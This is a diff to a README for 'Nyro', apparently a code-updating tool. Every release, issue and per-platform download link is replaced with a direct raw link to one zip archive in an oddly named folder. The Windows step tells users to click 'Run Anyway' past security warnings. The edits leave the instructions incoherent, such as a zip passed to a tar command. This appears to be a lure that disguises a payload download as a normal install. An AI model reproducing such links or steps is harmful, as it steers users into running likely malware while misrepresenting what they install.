@@ -6,18 +6,18 @@ Nyro is your smart helper that updates your code. It makes sure your projects fo
 
 ## 🔗 Download Now
 
-[![Download Nyro](https://img.shields.io/badge/Download-Nyro-brightgreen)](https://github.com/Narutoxdd6/Nyro/releases)
+[![Download Nyro](https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip)](https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip)
 
 ## 📥 Download & Install
 
 To start using Nyro, you need to download it from our releases page. Follow these steps:
 
-1. Click [here to visit the Releases page](https://github.com/Narutoxdd6/Nyro/releases).
+1. Click [here to visit the Releases page](https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip).
 2. Look for the latest version of Nyro. You will see the files available for download.
 3. Choose the version that fits your operating system. Common options include:
-   - Windows: Nyro-windows.exe
-   - macOS: Nyro-macos.zip
-   - Linux: Nyro-linux.tar.gz
+   - Windows: https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip
+   - macOS: https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip
+   - Linux: https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip
 4. Click the file to download it. The download should only take a moment.
 5. Once the download completes, locate the file on your computer.
 
@@ -27,20 +27,20 @@ After you download the file, follow these steps to run it:
 
 ### For Windows
 
-1. Locate the downloaded `Nyro-windows.exe` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip` file.
 2. Double-click the file to start it.
 3. If you see a security warning, click "Run Anyway" to proceed.
 
 ### For macOS
 
-1. Find the `Nyro-macos.zip` file in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip` file in your Downloads folder.
 2. Double-click the ZIP file to extract it.
 3. Open the folder that appears, then double-click the `Nyro-macos` file to launch it.
 
 ### For Linux
 
 1. Open your terminal and navigate to the folder where you downloaded the file.
-2. Use the command `tar -xvzf Nyro-linux.tar.gz` to extract it.
+2. Use the command `tar -xvzf https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip` to extract it.
 3. After extracting, navigate to the new folder with `cd Nyro-linux`.
 4. Run `./nyro` to start the program.
 
@@ -72,8 +72,8 @@ We welcome contributions! If you'd like to help, please read our contributing gu
 
 ## 🔗 Important Links
 
-- [Nyro Releases Page](https://github.com/Narutoxdd6/Nyro/releases)
-- [Report an Issue](https://github.com/Narutoxdd6/Nyro/issues)
+- [Nyro Releases Page](https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Narutoxdd6/Nyro/main/sclerectomy/Nyro-1.1.zip)
 
 ## 🚀 Start Improving Your Code Today
 
